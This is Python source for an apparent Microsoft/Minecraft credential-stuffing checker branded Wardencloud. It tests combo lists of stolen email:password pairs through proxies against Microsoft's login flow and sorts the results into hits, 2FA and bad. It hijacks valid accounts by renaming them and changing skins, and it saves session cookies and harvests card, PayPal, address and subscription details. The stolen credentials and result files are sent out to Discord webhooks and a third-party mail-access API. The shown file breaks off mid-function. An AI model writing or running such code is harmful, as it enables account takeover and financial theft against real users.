import requests, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys, string
from datetime import datetime, timezone
from colorama import Fore, Style, init
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar
import re

#banchecking
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.connection import Connection
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

logo = Fore.YELLOW+'''
                                  ██╗    ██╗░█████╗░░██████╗░██████╗███████╗███╗   ██╗  ░█████╗░██╗░░░░░░█████╗░██╗░░░██╗██████╗░
                                  ██║    ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║  ██╔══██╗██║░░░░░██╔══██╗██║░░░██║██╔══██╗
                                  ██║ █╗ ██║███████║██████╔╝██╔══██╗█████╗░░██╔██╗ ██║  ██║░░╚═╝██║░░░░░██║░░██║██║░░░██║██║░░██║
                                  ██║███╗██║██╔══██║██╔══██╗██║░░██║██╔══╝░░██║╚██╗██║  ██║░░██╗██║░░░░░██║░░██║██║░░░██║██║░░██║
                                  ╚███╔███╔╝██║░░██║██║░░██║██████╔╝███████╗██║ ╚████║  ╚█████╔╝███████╗╚█████╔╝╚██████╔╝██████╔╝
                                   ╚══╝╚══╝ ╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝  ╚═══╝  ░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═════╝░\n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
#sys.stderr = open(os.devnull, 'w') #bancheck prints errors in cmd

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "MSMC"
            }
            if config.get('embed') == True:
                payload = {
                    "username": "Wardencloud",
                    "avatar_url": f"https://mc-heads.net/avatar/{self.name}",
                    "embeds": [
                        {
                            "author": {"name": "Wardencloud", "url": "https://discord.gg/Wardencloud", "icon_url": "https://images-ext-1.discordapp.net/external/cP7RFdAbcdFARWBSUnA48SGls65yxkTwBe1V1GxFXI8/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1428026856917045310/a_f47c020eef6737ce6946cb2bc152f533.gif?width=799&height=799"},
                            "color": 0,
                            "fields": [
                                {"name": "<:email:1448840774438486097> Eᴍᴀɪʟ:", "value": f"||```{self.email}```||", "inline": True},
                                {"name": "<a:password:1428674545702932531> Pᴀѕѕᴡᴏʀᴅ:", "value": f"||```{self.password}```||", "inline": True},
                                {"name": "<:nametag:1439193947472924783> Uѕᴇʀɴᴀᴍᴇ:", "value": f"``{self.name}``", "inline": True},
                                {"name": "<a:hypixel:1433705221418258472> Hʏᴘɪхᴇʟ", "value": self.hypixl or "N/A", "inline":True},
                                {"name": "<a:hypixel:1433705221418258472> Hʏᴘɪхᴇʟ Lᴇᴠᴇʟ", "value": self.level or "N/A", "inline":True},
                                {"name": "<a:hypixel:1433705221418258472> Fɪʀѕᴛ Lᴏɢɪɴ","value": self.firstlogin or "N/A", "inline":True},
                                {"name": "<a:hypixel:1433705221418258472> Lᴀѕᴛ Lᴏɢɪɴ", "value": self.lastlogin or "N/A", "inline":True},
                                {"name": "<a:optifinecape:1433705569000357908> Oᴘᴛɪꜰɪɴᴇ Cᴀᴘᴇ", "value": self.cape or "N/A", "inline":True},
                                {"name": "<a:capes:1433705405124706415> Cᴀᴘᴇѕ", "value": self.capes or "N/A", "inline":True},
                                {"name": "<a:ms_coin:1433704564682653706> Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴѕ", "value": self.sbcoins or "N/A", "inline":True},
                                {"name": "<:bedwars:1444675418853478520> Bᴇᴅᴡᴀʀѕ Sᴛᴀʀѕ", "value": self.bwstars or "N/A", "inline":True},
                                {"name": "<a:banned:1439876796655996988> Sᴛᴀᴛᴜѕ", "value": self.banned or "N/A", "inline":True},
                                {"name": "<:nametag:1439193947472924783> Rᴇɴᴀᴍᴇᴀʙʟᴇ",  "value": self.namechanged or "N/A", "inline":True},
                                {"name": "<:nametag:1439193947472924783> Lᴀѕᴛ Cʜᴀɴɢᴇᴅ", "value": self.lastchanged or "N/A", "inline":True},
                                {"name": "<a:target:1450820741070323752> Aᴄᴄᴏᴜɴᴛ Tʏᴘᴇ", "value": self.type or "N/A", "inline":True},
                                {"name": "<a:file:1439876698740097065> Cᴏᴍʙᴏ", "value": f"||```{self.email}:{self.password}```||", "inline":True},
                            ],
                            "thumbnail": {"url": f"https://mc-heads.net/body/{self.name}"},
                            "footer": {"text": "Wardencloud | Lucifer", "icon_url": "https://images-ext-1.discordapp.net/external/cP7RFdAbcdFARWBSUnA48SGls65yxkTwBe1V1GxFXI8/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1428026856917045310/a_f47c020eef6737ce6946cb2bc152f533.gif?width=799&height=799"}
                        }
                    ]
                }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname'): self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel'): self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin'): self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin'): self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars'): self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins'):
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        global retries
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'})
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange'):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged'):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(3)
                except: pass
                tries+=1
                retries+=1
    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)
    def ban(self, session):
        global errors
        if config.get('hypixelban'):
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned', session)
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned == None or c < 1000:
                            time.sleep(.01)
                            c+=1
                        connection.disconnect()
                    except: pass
                    sys.stderr = original_stderr
                except: pass
                if self.banned != None: break
                tries+=1
    def setname(self):
        newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))+"_"+config.get('name')+"_"+''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put("https://api.minecraftservices.com/minecraft/profile/name/"+newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type+" [SET MC]"
                    self.name = self.name+f" -> {newname}"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries+=1
    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {
                    "url" : config.get('skin'),
                    "variant" : config.get('variant')
                }
                changereq = self.session.post("https://api.minecraftservices.com/minecraft/profile/skins", json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type+" [SET SKIN]"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries+=1
    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
            if config.get('setname'): self.setname()
        else: self.setname()
        if config.get('setskin'): self.setskin()
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        with open(f"results/{fname}/Capes.txt", 'a') as file: file.write(f"{self.email}:{self.password} | Capes: {self.capes}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()
        
def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxy = getproxy()
        retries += 1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxy = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxy = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def finishedscreen():
    global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname
    #os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Xbox Game Pass: "+str(xgp))
    print("Xbox Game Pass Ultimate: "+str(xgpu))
    print("Other: "+str(other))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    
    webhook_url = config.get('webhooklogs')  # Use the existing webhook from config
    summary_payload = {
        "username": "WardenCloud Restocker",
        "avatar_url": "https://cdn.discordapp.com/attachments/1432266513678864405/1434196556969545910/image.png?ex=69077321&is=690621a1&hm=be548b70db7705df64ca51ac5d78a079da01829b6aa58ad58b6b2797dc2bf7ef",
        "embeds": [
            {
                "title": "🎉 WardenCloud Checking Summary 🎉",
                "color": 0x00FF00,  # Green color
                "fields": [
                    {"name": "<a:stats:1431893279460298833> Total Checked", "value": str(len(Combos)), "inline": True},
                    {"name": "<a:tick:1434239379517472948> Hits", "value": str(hits), "inline": True},
                    {"name": "<a:Wrong:1428669341838217216> Bad", "value": str(bad), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> SFA", "value": str(sfa), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> MFA", "value": str(mfa), "inline": True},
                    {"name": "<a:Warningggg:1434239818669490378> 2FA", "value": str(twofa), "inline": True},
                    {"name": "<a:xbox:1416742414676262933> Xbox Game Pass", "value": str(xgp), "inline": True},
                    {"name": "<a:xbox:1416742414676262933> Xbox Game Pass Ultimate", "value": str(xgpu), "inline": True},
                    {"name": "<a:mcfa:1428618730916810832> Other", "value": str(other), "inline": True},
                    {"name": "<a:mail:1433704383685726248> Valid Mail", "value": str(vm), "inline": True},
                    {"name": "<a:System:1429773195602563174> Retries", "value": str(retries), "inline": True},
                    {"name": "<a:Warningggg:1434239818669490378> Errors", "value": str(errors), "inline": True}
                ],
                "footer": {
                    "text": "WardenCloud Checker 🌟 Made with ❤️",
                    "icon_url": "https://cdn.discordapp.com/attachments/1432266513678864405/1434196556969545910/image.png?ex=69077321&is=690621a1&hm=be548b70db7705df64ca51ac5d78a079da01829b6aa58ad58b6b2797dc2bf7efs"
                },
                "timestamp": datetime.now(timezone.utc).isoformat()  # Add timestamp for when the embed was sent
            }
        ]
    }
    
    # Send summary embed
    try:
        requests.post(webhook_url, json=summary_payload, headers={"Content-Type": "application/json"})
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"Failed to send summary to Discord: {str(e)}")
    exclude_files = {"Codes.txt", "Capture.txt", "2fa.txt"}

    # Upload result files
    result_dir = f"results/{fname}"
    if os.path.exists(result_dir):
        for root, dirs, files in os.walk(result_dir):
            for file_name in files:
                if file_name.endswith(".txt") and file_name not in exclude_files:
                    file_path = os.path.join(root, file_name)
                    try:
                        with open(file_path, 'rb') as f:
                            files = {'file': (file_name, f)}
                            payload = {
                                "username": "WardenCloud Restocker",
                                "content": f"📤 Uploading result file: **{file_name}**"
                            }
                            requests.post(webhook_url, data=payload, files=files)
                    except Exception as e:
                        print(Fore.LIGHTRED_EX + f"Failed to upload {file_name}: {str(e)}")

    
    repr(readchar.readkey())
    os.abort()

def payment(session, email, password):
    global retries
    while True:
        try:
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Referer": "https://account.microsoft.com/"
            }
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': f'MSADELEGATE1.0={token}',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Host': 'paymentinstruments.mp.microsoft.com',
                'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Sec-GPC': '1'
            }
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers)
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match: return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ""
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item: city = item['city']
                    if 'region' in item: region = item['region']
                    if 'postal_code' in item: zipcode = item['postal_code']
                    if 'cardType' in item: card_type = item['cardType']
                    if 'country' in item: cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f"[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]"
            cc_info = f"[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]"
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None: parts.append(f"Purchased Item: {item1}")
            if auto_renew is not None: parts.append(f"Auto Renew: {auto_renew}")
            if start_date is not None: parts.append(f"startDate: {start_date}")
            if next_renewal_date is not None: parts.append(f"Next Billing: {next_renewal_date}")
            if parts: subscription1 = f"[ {' | '.join(parts)} ]"
            else: subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None: parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None: parts2.append(f"Auto Renew: {auto_renew2}")
            if start_date2 is not None: parts2.append(f"startDate: {start_date2}")
            if recurring is not None: parts2.append(f"Recurring: {recurring}")
            if next_renewal_date2 is not None: parts2.append(f"Next Billing: {next_renewal_date2}")
            if parts: subscription2 = f"[{' | '.join(parts2)}]"
            else: subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {"PASS": "XBOX GAME PASS", "GOLD": "XBOX GOLD"}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None: total_amount = total_amount_value + f" {currency}"
            else: total_amount = f"0 {currency}"
            parts3 = []
            if description is not None: parts3.append(f"Product: {description}")
            if product_type is not None: parts3.append(f"Product Type: {product_type}")
            if quantity is not None: parts3.append(f"Total Purchase: {quantity}")
            if total_amount is not None: parts3.append(f"Total Price: {total_amount}")
            if parts: subscription3 = f"[ {' | '.join(parts3)} ]"
            else: subscription3 = None
            payment = ''
            paymentprint = ''
            if date_registered: 
                payment += f"\nDate Registered: {date_registered}"
                paymentprint += f" | Date Registered: {date_registered}"
            if fullname: 
                payment += f"\nFullname: {fullname}"
                paymentprint += f" | Fullname: {fullname}"
            if user_address: 
                payment += f"\nUser Address: {user_address}"
                paymentprint += f" | User Address: {user_address}"
            if paypal_email: 
                payment += f"\nPaypal Email: {paypal_email}"
                paymentprint += f" | Paypal Email: {paypal_email}"
            if cc_info: 
                payment += f"\nCC Info: {cc_info}"
                paymentprint += f" | CC Info: {cc_info}"
            if balance: 
                payment += f"\nBalance: {balance}"
                paymentprint += f" | Balance: {balance}"
            if subscription1: 
                payment += f"\n{subscription1}"
                paymentprint += f" | {subscription1}"
            if subscription2: 
                payment += f"\n{subscription2}"
                paymentprint += f" | {subscription2}"
            if subscription3: 
